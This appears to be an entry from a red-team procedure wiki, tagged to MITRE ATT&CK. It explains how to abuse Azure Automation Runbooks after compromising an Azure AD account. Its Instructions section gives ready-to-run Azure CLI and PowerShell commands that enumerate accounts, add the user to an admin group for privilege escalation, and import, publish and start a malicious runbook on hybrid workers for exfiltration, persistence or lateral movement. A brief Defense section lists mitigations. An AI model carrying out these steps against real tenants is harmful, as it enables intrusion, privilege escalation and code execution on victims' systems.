---
id: 729931ac-c5e6-41d5-9c5d-9e1e49f4ee44
name: Create-and-Execute-Malicious-Azure-Runbook
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.541167+00:00'
updated_at: '2023-05-24T22:51:17.531111+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Scripting|T1064 - Scripting]]'
platforms:
  - Cloud
tags:
  - '[[tags/Azure Runbook]]'
  - '[[tags/Cloud - Azure]]'
  - '[[tags/Create a Runbook]]'
  - '[[tags/Runbook Automation]]'
  - azure
  - privilege-escalation
  - defense-evasion
commands:
  - '[[commands/add-user-to-automation-admins-group]]'
  - '[[commands/check-user-rights-for-automation]]'
  - '[[commands/create-powershell-runbook]]'
  - '[[commands/get-user-role-on-automation-account]]'
  - '[[commands/list-automation-accounts]]'
  - '[[commands/list-hybrid-worker-groups]]'
  - '[[commands/list-owned-objects-in-azure-ad]]'
  - '[[commands/publish-azure-runbook]]'
  - '[[commands/start-azure-runbook]]'
tools: []
validated: true
---

# Create-and-Execute-Malicious-Azure-Runbook

## Summary

This procedure outlines how to leverage Azure Automation Runbooks to automate malicious activities, such as executing scripts on hybrid workers for persistence, data exfiltration, or privilege escalation. It involves verifying user privileges, elevating access if needed, creating a PowerShell runbook with malicious content, publishing it, and executing it on target hybrid worker groups within an Azure environment.

## Description

Azure Runbooks allow automation of tasks using PowerShell or other scripts within Azure Automation Accounts. In an offensive context, attackers with compromised Azure credentials can use runbooks to bypass detection by scheduling or manually triggering malicious code execution on on-premises hybrid workers connected to Azure. This technique evades traditional endpoint detection by leveraging cloud-orchestrated execution. The procedure assumes initial access to an Azure AD user with potential for elevation to Automation Contributor or higher roles. It maps to MITRE ATT&CK for Defense Evasion (TA0005) via scripted automation and Execution (TA0002) through remote script invocation. Prerequisites include Azure CLI or PowerShell modules installed, and the target environment is Azure Cloud with Hybrid Runbook Workers configured.

## Requirements

1. Compromised Azure AD user credentials with read access to subscriptions and resource groups.
2. Azure CLI (for initial checks) or Azure PowerShell modules (Az.Accounts, Az.Automation, AzureAD) installed on the attacker's machine.
3. A local PowerShell script file (e.g., malicious.ps1) containing the payload to import as the runbook content.
4. Access to an Automation Account; if not, ability to create or elevate to one.
5. Network connectivity to Azure endpoints (no direct on-premises access needed initially).

## Defense

- Restrict Automation Account roles to least privilege; avoid broad Contributor access for users.
- Enable Azure Activity Logs and monitor for runbook creation, publication, and execution events via Azure Monitor or Sentinel.
- Implement just-in-time (JIT) access for Automation Admins and audit group membership changes in Azure AD.
- Scan runbook content for malicious scripts before publication and use Azure Policy to enforce code signing.
- Monitor hybrid worker connections for anomalous script executions and isolate workers if suspicious activity is detected.

## Objectives

1. Verify and elevate the compromised user's privileges on the Automation Account to enable runbook creation and execution.
2. Identify available Automation Accounts and Hybrid Worker Groups for targeting.
3. Import and publish a malicious PowerShell runbook to the Automation Account.
4. Execute the runbook on a specified Hybrid Worker Group to achieve lateral movement or persistence.
5. Confirm successful execution through job status and output logs.

## Instructions

### Step 1: Install Azure Automation Extension and Check Initial Access

**Context**: Begin by ensuring the Azure CLI extension for automation is available and list accessible Automation Accounts to assess initial privileges. If no accounts are listed, the user lacks access.

**Command** ([[commands/check-user-rights-for-automation]]):
```bash
az extension add --upgrade -n automation
```

> This installs or updates the Azure CLI extension for automation commands. Expected output is a success message if the extension is added or already present.

**Command** ([[commands/list-automation-accounts]]):
```bash
az automation account list
```

> Lists all Automation Accounts the signed-in user can access. If empty, proceed to elevation. Expected output is a JSON array of accounts with names, resource groups, and locations.

### Step 2: List Owned Objects in Azure AD

**Context**: Query Azure AD for objects owned by the signed-in user to identify potential Automation-related resources or groups for elevation.

**Command** ([[commands/list-owned-objects-in-azure-ad]]):
```bash
az ad signed-in-user list-owned-objects
```

> Retrieves a list of Azure AD objects (apps, groups) owned by the user. Look for Automation Admins or similar groups. Expected output is JSON detailing owned objects, including IDs for group membership.

### Step 3: Elevate Privileges by Adding User to Automation Admins Group

**Context**: If the user lacks sufficient privileges (e.g., no access to Automation Accounts), add them to a custom group like "Automation Admins" using Azure AD PowerShell. This requires existing Contributor-like access or prior compromise of an admin.

**Command** ([[commands/add-user-to-automation-admins-group]]):
```powershell
Add-AzureADGroupMember -ObjectId $_GROUP_OBJECT_ID -RefObjectId $_USER_OBJECT_ID -Verbose
```

> Adds the signed-in user to the specified group. Use ObjectIds from Step 2. Expected output is verbose confirmation of membership addition.

### Step 4: Verify User Role on the Automation Account

**Context**: Check the user's specific role assignments on the target Automation Account to confirm ability to create and execute runbooks (requires Contributor or higher).

**Command** ([[commands/get-user-role-on-automation-account]]):
```powershell
Get-AzRoleAssignment -Scope /subscriptions/$_SUBSCRIPTION_ID/resourceGroups/$_RESOURCE_GROUP_NAME/providers/Microsoft.Automation/automationAccounts/$_AUTOMATION_ACCOUNT_NAME
```

> Queries role assignments for the scope. Expected output is a table or list showing roles like "Contributor" for the user; if none, elevation failed.

### Step 5: List Available Hybrid Worker Groups

**Context**: Identify Hybrid Runbook Worker Groups connected to the Automation Account, which allow execution of runbooks on on-premises machines for lateral movement.

**Command** ([[commands/list-hybrid-worker-groups]]):
```powershell
Get-AzAutomationHybridWorkerGroup -AutomationAccountName $_AUTOMATION_ACCOUNT_NAME -ResourceGroupName $_RESOURCE_GROUP_NAME
```

> Lists worker groups. Expected output is a list of groups (e.g., "Workergroup1") with status; select one for execution.

### Step 6: Create the PowerShell Runbook

**Context**: Import a local malicious PowerShell script as a new runbook into the Automation Account. The script (e.g., username.ps1) should contain the payload, such as data exfiltration commands.

**Command** ([[commands/create-powershell-runbook]]):
```powershell
Import-AzAutomationRunbook -Name $_RUNBOOK_NAME -Path $_SCRIPT_PATH -AutomationAccountName $_AUTOMATION_ACCOUNT_NAME -ResourceGroupName $_RESOURCE_GROUP_NAME -Type PowerShell -Force -Verbose
```

> Imports the script. Expected output is verbose confirmation of import, with runbook ID.

### Step 7: Publish the Runbook

**Context**: Publish the imported runbook to make it executable. This step activates the malicious content.

**Command** ([[commands/publish-azure-runbook]]):
```powershell
Publish-AzAutomationRunbook -RunbookName $_RUNBOOK_NAME -AutomationAccountName $_AUTOMATION_ACCOUNT_NAME -ResourceGroupName $_RESOURCE_GROUP_NAME -Verbose
```

> Publishes the runbook. Expected output is verbose success message.

### Step 8: Start the Runbook on Hybrid Worker

**Context**: Trigger the runbook execution on a specific Hybrid Worker Group to run the malicious script on the target on-premises system.

**Command** ([[commands/start-azure-runbook]]):
```powershell
Start-AzAutomationRunbook -RunbookName $_RUNBOOK_NAME -RunOn $_WORKER_GROUP_NAME -AutomationAccountName $_AUTOMATION_ACCOUNT_NAME -ResourceGroupName $_RESOURCE_GROUP_NAME -Verbose
```

> Starts the job. Expected output is job ID; monitor via Get-AzAutomationJob for completion and output.
